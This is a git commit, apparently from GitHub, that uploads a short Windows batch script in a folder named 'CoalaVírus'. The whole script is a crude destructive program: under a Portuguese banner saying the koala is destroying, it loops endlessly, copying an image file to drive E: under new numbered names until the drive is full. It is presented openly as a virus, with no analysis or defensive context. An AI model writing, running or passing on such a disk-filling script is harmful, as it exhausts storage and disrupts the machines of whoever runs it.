748bfbbe751d6b0e0947f8336cda7022f722a16b
Viniiixz <66135817+Viniiixz@users.noreply.github.com>
2020-06-29 19:05:59 -0300

    Add files via upload

---
+++ CoalaVírus/KoalaProfissionalEdt.bat
@@ -0,0 +1,10 @@
+@echo off
+set i=1
+: inicio
+echo ----------------------O-KOALA-ESTÁ-DESTRUINDO----------------------
+@echo off
+set /a j=i
+set /a i+=1
+copy Koala.jpg e:\koala%i%.jpg
+goto inicio
+pause
